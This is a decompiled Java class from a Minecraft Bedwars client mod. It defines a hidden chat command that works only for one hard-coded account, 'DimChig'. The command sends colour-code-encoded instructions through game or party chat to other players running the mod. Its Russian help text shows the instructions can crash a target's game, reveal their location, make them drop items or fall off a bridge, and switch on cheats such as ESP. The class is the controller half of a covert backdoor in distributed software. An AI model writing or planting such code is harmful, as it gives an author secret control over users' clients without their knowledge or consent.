/*     */ package com.dimchig.bedwarsbro.dimchigspecial;
/*     */ 
/*     */ import com.dimchig.bedwarsbro.ChatSender;
/*     */ import com.dimchig.bedwarsbro.Main;
/*     */ import com.dimchig.bedwarsbro.MyChatListener;
/*     */ import net.minecraft.client.Minecraft;
/*     */ import net.minecraft.command.CommandBase;
/*     */ import net.minecraft.command.CommandException;
/*     */ import net.minecraft.command.ICommandSender;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ public class CommandManipulate
/*     */   extends CommandBase
/*     */ {
/*  27 */   public static String command_text = "bwmanipulate";
/*     */   
/*     */   public CommandManipulate() {
/*  30 */     this; this; command_text = command_text.replace("/", "");
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean func_71519_b(ICommandSender sender) {
/*  35 */     return true;
/*     */   }
/*     */ 
/*     */   
/*     */   public String func_71517_b() {
/*  40 */     this; return command_text;
/*     */   }
/*     */ 
/*     */   
/*     */   public String func_71518_a(ICommandSender sender) {
/*  45 */     return "Manipulate";
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public void func_71515_b(ICommandSender sender, String[] args) throws CommandException {
/*  51 */     if (!(Minecraft.func_71410_x()).field_71439_g.func_70005_c_().equals("DimChig")) {
/*  52 */       ChatSender.addText(MyChatListener.PREFIX_BEDWARSBRO + "&cНеизвестная команда");
/*     */       
/*     */       return;
/*     */     } 
/*  56 */     if (args.length != 2) {
/*  57 */       this; ChatSender.addText("/" + command_text + " &eник &7[&bкоманда] &7(или &epc&b1&7)");
/*  58 */       ChatSender.addText("&b1 &7- &eливнет");
/*  59 */       ChatSender.addText("&b2 &7- &eскажет инфу про местоположение");
/*  60 */       ChatSender.addText("&b3 &7- &aвключить  &eHitBlock");
/*  61 */       ChatSender.addText("&b4 &7- &cвыключить &eHitBlock");
/*  62 */       ChatSender.addText("&b5 &7- &eсказать свою версию мода");
/*  63 */       ChatSender.addText("&b6 &7- &eкрашнуть ему игру");
/*  64 */       ChatSender.addText("&b7 &7- &eдропнуть слот");
/*  65 */       ChatSender.addText("&b8 &7- &eупасть с моста");
/*  66 */       ChatSender.addText("&b9 &7- &eинфа про пати");
/*  67 */       ChatSender.addText("&ba &7- &eвключить esp");
/*     */       
/*     */       return;
/*     */     } 
/*     */     try {
/*  72 */       String nick = args[0];
/*  73 */       String cmd_s = args[1];
/*  74 */       boolean isforPartyChat = false;
/*  75 */       String cmd = "none";
/*  76 */       if (cmd_s.contains("pc")) {
/*  77 */         cmd = cmd_s.replace("pc", "").trim();
/*  78 */         isforPartyChat = true;
/*     */       } else {
/*  80 */         cmd = cmd_s;
/*  81 */       }  if (cmd.equals("none")) {
/*  82 */         ChatSender.addText("&cInvalid command &e" + cmd + "&c!");
/*     */         
/*     */         return;
/*     */       } 
/*  86 */       PlayerManipulator.COMMAND command = PlayerManipulator.COMMAND.getById(cmd);
/*  87 */       String text = Main.playerManipulator.getCommand(nick, command);
/*  88 */       if (text == null) {
/*  89 */         ChatSender.addText("Ошибка!");
/*     */         
/*     */         return;
/*     */       } 
/*     */       
/*  94 */       String text_with_colorcodes = "";
/*  95 */       for (int i = 0; i < text.length(); i++) {
/*  96 */         text_with_colorcodes = text_with_colorcodes + "&" + text.charAt(i);
/*     */       }
/*     */       
/*  99 */       if (isforPartyChat) { text_with_colorcodes = "/pc " + text_with_colorcodes; }
/* 100 */       else if (MyChatListener.IS_IN_GAME) { text_with_colorcodes = "!" + text_with_colorcodes; }
/* 101 */        ChatSender.sendText(text_with_colorcodes);
/*     */     }
/* 103 */     catch (Exception ex) {
/* 104 */       ChatSender.addText("Ошибка! " + ex.getLocalizedMessage());
/*     */       return;
/*     */     } 
/*     */   }
/*     */ }


/* Location:              C:\Users\1337a\Downloads\bedwarsbro-1.69\!\com\dimchig\bedwarsbro\dimchigspecial\CommandManipulate.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */